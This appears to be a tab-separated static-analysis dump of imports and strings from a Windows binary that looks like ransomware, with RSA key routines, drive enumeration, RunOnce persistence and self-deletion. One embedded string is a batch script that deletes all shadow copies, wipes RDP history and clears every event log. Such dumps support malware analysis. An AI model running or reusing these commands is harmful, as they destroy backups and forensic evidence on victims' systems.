reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x406f01	0x406e97	string	0x406dda	3\r|$
0x4070d6	0x4070f0	string	0x40704b	j\bY3\r|$
0x407291	0x401014	import	0x407278	ADVAPI32.dll.CryptAcquireContextW
0x4072ab	0x40100c	import	0x407278	ADVAPI32.dll.CryptGenRandom
0x4072b9	0x401010	import	0x407278	ADVAPI32.dll.CryptReleaseContext
0x4072c2	0x4072ce	string	0x407278	^_[]
0x4072c4	0x401010	import	0x407278	ADVAPI32.dll.CryptReleaseContext
0x4072e8	0x401cc4	string	0x407278	SHA224
0x407308	0x401ccc	string	0x407278	SHA256
0x4077d6	0x401fd4	string	0x40770d	%d.%d
0x40785d	0x40784e	string	0x40770d	]_^[
0x408508	0x408560	string	0x408457	[_^]
0x408549	0x408560	string	0x408457	[_^]
0x408559	0x408560	string	0x408457	[_^]
0x4087fc	0x40885c	string	0x40871a	9\$,u\rUUW
0x40886a	0x408929	string	0x40871a	^]_[
0x40889f	0x408929	string	0x40871a	^]_[
0x408922	0x408929	string	0x40871a	^]_[
0x4089d8	0x408b87	string	0x408968	^_][
0x408a62	0x408b87	string	0x408968	^_][
0x408b67	0x408b87	string	0x408968	^_][
0x408b79	0x408b87	string	0x408968	^_][
0x408b80	0x408b87	string	0x408968	^_][
0x408da3	0x408e54	string	0x408d81	_^][
0x408db6	0x408e54	string	0x408d81	_^][
0x408dcc	0x408e54	string	0x408d81	_^][
0x408dda	0x408e54	string	0x408d81	_^][
0x408dff	0x408e54	string	0x408d81	_^][
0x408e14	0x408e54	string	0x408d81	_^][
0x408e3b	0x408e54	string	0x408d81	_^][
0x408e4d	0x408e54	string	0x408d81	_^][
0x40938e	0x401048	import	0x409371	KERNEL32.dll.SetFilePointerEx
0x409398	0x401038	import	0x409371	KERNEL32.dll.GetLastError
0x4093ed	0x402128	string	0x4093b5	{%08lX-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}
0x4093f6	0x401118	import	0x4093b5	USER32.dll.wsprintfA
0x409403	0x401034	import	0x4093b5	KERNEL32.dll.lstrlenA
0x409470	0x409b65	string	0x40940d	UVW3
0x4094a5	0x4010f0	import	0x40940d	RPCRT4.dll.UuidCreate
0x4094dd	0x40104c	import	0x40940d	KERNEL32.dll.CreateFileW
0x4094e3	0x401040	import	0x40940d	KERNEL32.dll.WriteFile
0x4094fa	0x40103c	import	0x40940d	KERNEL32.dll.GetFileSizeEx
0x40951e	0x401034	import	0x40940d	KERNEL32.dll.lstrlenA
0x4095b4	0x401034	import	0x40940d	KERNEL32.dll.lstrlenA
0x409705	0x401044	import	0x40940d	KERNEL32.dll.ReadFile
0x4097a2	0x401044	import	0x40940d	KERNEL32.dll.ReadFile
0x4098c8	0x401034	import	0x40940d	KERNEL32.dll.lstrlenA
0x4098da	0x4010dc	import	0x40940d	KERNEL32.dll.CloseHandle
0x409979	0x401034	import	0x409918	KERNEL32.dll.lstrlenA
0x409984	0x401034	import	0x409918	KERNEL32.dll.lstrlenA
0x409992	0x401034	import	0x409918	KERNEL32.dll.lstrlenA
0x4099a3	0x401034	import	0x409918	KERNEL32.dll.lstrlenA
0x4099ac	0x40107c	import	0x409918	KERNEL32.dll.lstrcmpiA
0x409a85	0x401090	import	0x409a50	KERNEL32.dll.CreateProcessW
0x409aa4	0x4010bc	import	0x409a92	KERNEL32.dll.MultiByteToWideChar
0x409ac6	0x4010bc	import	0x409a92	KERNEL32.dll.MultiByteToWideChar
0x409af7	0x40109c	import	0x409ad3	KERNEL32.dll.GetTempFileNameW
0x409afd	0x402560	string	0x409ad3	.bat
0x409b09	0x401088	import	0x409ad3	KERNEL32.dll.lstrcatW
0x409b25	0x40104c	import	0x409ad3	KERNEL32.dll.CreateFileW
0x409b36	0x402398	string	0x409ad3	@echo off\r\nvssadmin.exe Delete Shadows /All /Quiet\r\nreg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f\r\nreg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f\r\nreg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"\r\ncd %userprofile%\documents\\r\nattrib Default.rdp -s -h\r\ndel Default.rdp \r\nfor /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
0x409b3d	0x401034	import	0x409ad3	KERNEL32.dll.lstrlenA
0x409b46	0x401040	import	0x409ad3	KERNEL32.dll.WriteFile
0x409b4d	0x4010dc	import	0x409ad3	KERNEL32.dll.CloseHandle
0x409b79	0x4010c0	import	0x409b65	KERNEL32.dll.WideCharToMultiByte
0x409b99	0x4010c0	import	0x409b65	KERNEL32.dll.WideCharToMultiByte
0x409be4	0x40108c	import	0x409ba7	KERNEL32.dll.GetModuleFileNameW
0x409bfa	0x40256c	string	0x409ba7	COMSPEC
0x409bff	0x401094	import	0x409ba7	KERNEL32.dll.GetEnvironmentVariableW
0x409c0d	0x401088	import	0x409ba7	KERNEL32.dll.lstrcatW
0x409c19	0x40257c	string	0x409ba7	/c del
0x409c31	0x40258c	string	0x409ba7	> nul
0x409c62	0x40259c	string	0x409ba7	Open
0x409c72	0x4010fc	import	0x409ba7	SHELL32.dll.ShellExecuteExW
0x409c80	0x4010b8	import	0x409ba7	KERNEL32.dll.SetPriorityClass
0x409c8e	0x401050	import	0x409ba7	KERNEL32.dll.GetCurrentProcess
0x409c9a	0x40105c	import	0x409ba7	KERNEL32.dll.GetCurrentThread
0x409ca1	0x401060	import	0x409ba7	KERNEL32.dll.SetThreadPriority
0x409cc5	0x4010a4	import	0x409cc1	KERNEL32.dll.GetFileAttributesW
0x409ce1	0x401110	import	0x409cd8	SHLWAPI.dll.PathRemoveFileSpecW
0x409ce7	0x401088	import	0x409cd8	KERNEL32.dll.lstrcatW
0x409d1a	0x40104c	import	0x409cd8	KERNEL32.dll.CreateFileW
0x409d35	0x401034	import	0x409cd8	KERNEL32.dll.lstrlenA
0x409d43	0x401040	import	0x409cd8	KERNEL32.dll.WriteFile
0x409d4a	0x4010dc	import	0x409cd8	KERNEL32.dll.CloseHandle
0x409d89	0x40ab9e	string	0x409cd8	VWj\b
0x409da0	0x401088	import	0x409cd8	KERNEL32.dll.lstrcatW
0x409da9	0x401080	import	0x409cd8	KERNEL32.dll.lstrcmpiW
0x409dc9	0x4010d0	import	0x409cd8	KERNEL32.dll.lstrlenW
0x409df1	0x4010a8	import	0x409cd8	KERNEL32.dll.FindFirstFileW
0x409e4a	0x409b65	string	0x409cd8	UVW3
0x409e84	0x40ab9e	string	0x409cd8	VWj\b
0x409ecc	0x40110c	import	0x409cd8	SHLWAPI.dll.PathFindFileNameW
0x409ef6	0x4010a0	import	0x409cd8	KERNEL32.dll.SetFileAttributesW
0x409f2e	0x401084	import	0x409cd8	KERNEL32.dll.lstrcpyW
0x409f56	0x4010b4	import	0x409cd8	KERNEL32.dll.MoveFileExW
0x409f7a	0x4010ac	import	0x409cd8	KERNEL32.dll.FindNextFileW
0x409f89	0x401078	import	0x409cd8	KERNEL32.dll.FindClose
0x409fba	0x401030	import	0x409fb0	KERNEL32.dll.GetProcessHeap
0x409fc7	0x4010e0	import	0x409fb0	KERNEL32.dll.HeapAlloc
0x409fcf	0x40106c	import	0x409fb0	KERNEL32.dll.GetLogicalDrives
0x40a00b	0x401098	import	0x409fb0	KERNEL32.dll.GetDriveTypeA
0x40a02f	0x4010e0	import	0x409fb0	KERNEL32.dll.HeapAlloc
0x40a042	0x4010d8	import	0x409fb0	KERNEL32.dll.lstrcpyA
0x40a06b	0x401030	import	0x409fb0	KERNEL32.dll.GetProcessHeap
0x40a072	0x4010e0	import	0x409fb0	KERNEL32.dll.HeapAlloc
0x40a0a0	0x401058	import	0x409fb0	KERNEL32.dll.CreateThread
0x40a0b9	0x401064	import	0x409fb0	KERNEL32.dll.WaitForMultipleObjects
0x40a0e9	0x401034	import	0x40a0cc	KERNEL32.dll.lstrlenA
0x40a109	0x4010e8	import	0x40a0cc	KERNEL32.dll.HeapCreate
0x40a117	0x4010e0	import	0x40a0cc	KERNEL32.dll.HeapAlloc
0x40a171	0x4025c8	string	0x40a157	Software\Microsoft\Windows\CurrentVersion\RunOnce
0x40a17d	0x40101c	import	0x40a157	ADVAPI32.dll.RegOpenKeyExW
0x40a19d	0x40262c	string	0x40a157	CertificatesCheck
0x40a1aa	0x401000	import	0x40a157	ADVAPI32.dll.RegQueryValueExW
0x40a1bc	0x401080	import	0x40a157	KERNEL32.dll.lstrcmpiW
0x40a1d8	0x401004	import	0x40a157	ADVAPI32.dll.RegCreateKeyExW
0x40a1e9	0x4010d0	import	0x40a157	KERNEL32.dll.lstrlenW
0x40a201	0x401018	import	0x40a157	ADVAPI32.dll.RegSetValueExW
0x40a20b	0x401008	import	0x40a157	ADVAPI32.dll.RegCloseKey
0x40a237	0x40104c	import	0x40a21e	KERNEL32.dll.CreateFileW
0x40a244	0x401038	import	0x40a21e	KERNEL32.dll.GetLastError
0x40a24d	0x401038	import	0x40a21e	KERNEL32.dll.GetLastError
0x40a288	0x4010d8	import	0x40a21e	KERNEL32.dll.lstrcpyA
0x40a293	0x4010e4	import	0x40a21e	KERNEL32.dll.SetFilePointer
0x40a2ab	0x401040	import	0x40a21e	KERNEL32.dll.WriteFile
0x40a2c0	0x4010dc	import	0x40a21e	KERNEL32.dll.CloseHandle
0x40a3a9	0x40108c	import	0x40a32f	KERNEL32.dll.GetModuleFileNameW
0x40a3b6	0x401094	import	0x40a32f	KERNEL32.dll.GetEnvironmentVariableW
0x40a3bc	0x402650	string	0x40a32f	temp
0x40a3ff	0x40a0cc	string	0x40a32f	SUVW
0x40a415	0x40a0cc	string	0x40a32f	SUVW
0x40a42f	0x40a0cc	string	0x40a32f	SUVW
0x40a44e	0x40265c	string	0x40a32f	appdata
0x40a45b	0x401054	import	0x40a32f	KERNEL32.dll.ExitProcess
0x40a461	0x401088	import	0x40a32f	KERNEL32.dll.lstrcatW
0x40a479	0x40110c	import	0x40a32f	SHLWAPI.dll.PathFindFileNameW
0x40a492	0x401080	import	0x40a32f	KERNEL32.dll.lstrcmpiW
0x40a4b6	0x4010b0	import	0x40a32f	KERNEL32.dll.CopyFileW
0x40a4d5	0x40266c	string	0x40a32f	public
0x40a4e2	0x40267c	string	0x40a32f	ALLUSERSPROFILE
0x40a50f	0x401084	import	0x40a32f	KERNEL32.dll.lstrcpyW
0x40a52f	0x401108	import	0x40a32f	SHLWAPI.dll.PathAddBackslashW
0x40a537	0x401088	import	0x40a32f	KERNEL32.dll.lstrcatW
0x40a541	0x40a21e	string	0x40a32f	QQSW3
0x40a552	0x401068	import	0x40a32f	KERNEL32.dll.Sleep
0x40a59b	0x40269c	string	0x40a32f	{{IDENTIFIER}}
0x40a5a2	0x401104	import	0x40a32f	SHLWAPI.dll.StrStrA
0x40a5b3	0x401034	import	0x40a32f	KERNEL32.dll.lstrlenA
0x40a616	0x401070	import	0x40a32f	KERNEL32.dll.GetStdHandle
0x40a7be	0x401034	import	0x40a76d	KERNEL32.dll.lstrlenA
0x40a7e8	0x401040	import	0x40a76d	KERNEL32.dll.WriteFile
0x40a877	0x4026b4	string	0x40a81e	rsa_encrypt
0x40a87d	0x401034	import	0x40a81e	KERNEL32.dll.lstrlenA
0x40a99b	0x4026c0	string	0x40a95e	rsa_genkey
0x40a9a1	0x401034	import	0x40a95e	KERNEL32.dll.lstrlenA
0x40ab8c	0x402a0a	string	0x40a95e	SUVW
0x40abf0	0x401084	import	0x40abd3	KERNEL32.dll.lstrcpyW
0x40ac1d	0x4010d0	import	0x40ac18	KERNEL32.dll.lstrlenW
0x40ac38	0x401084	import	0x40ac18	KERNEL32.dll.lstrcpyW
0x40ac44	0x4010c8	import	0x40ac44	KERNEL32.dll.CreateToolhelp32Snapshot
0x40ac4a	0x401074	import	0x40ac4a	KERNEL32.dll.Process32FirstW
0x40ac50	0x401024	import	0x40ac50	KERNEL32.dll.Process32NextW
0x40ac56	0x4010f8	import	0x40ac56	SHELL32.dll.SHChangeNotify
0x40ac5c	0x40112c	import	0x40ac5c	ntdll.dll._aulldiv
0x40ac62	0x401128	import	0x40ac62	ntdll.dll._alldiv
0x40ac68	0x401124	import	0x40ac68	ntdll.dll._allrem
0x40ac6e	0x401120	import	0x40ac6e	ntdll.dll._chkstk
0x40d767	0x40d7dc	string	0x40ac6e	GetFileSizeEx
0x40d7d4	0x40d848	string	0x40ac6e	CreateThread
0x40d7de	0x40d826	string	0x40ac6e	GetCurrentProcess
0x40d831	0x40d8a2	string	0x40ac6e	GetLogicalDrives
0x40d879	0x40d8e4	string	0x40ac6e	lstrcmpiA
0x40d9ae	0x40d9f6	string	0x40ac6e	MultiByteToWideChar
0x40d9fc	0x40da72	string	0x40ac6e	CryptReleaseContext
0x40da25	0x40da88	string	0x40ac6e	CryptGenRandom
0x40da76	0x40daca	string	0x40ac6e	RegQueryValueExW
0x40dcf5	0x40dc7c	string	0x40ac6e	O~fV
0x40dd33	0x40ddaa	string	0x40ac6e	:)\r
0x40e4c0	0x40e506	string	0x40ac6e	-QKmp_G
0x40eaca	0x40eaee	string	0x40ac6e	\fع\vJ blocks=Basic Latin,Arabic
0x40eb4f	0x40eaf4	string	0x40ac6e	@ʁ6? blocks=Basic Latin,IPA Extensions
0x40eb64	0x40eba6	string	0x40ac6e	_\f$\e`
0x40eb96	0x40ebe8	string	0x40ac6e	1&\rD7\eN2
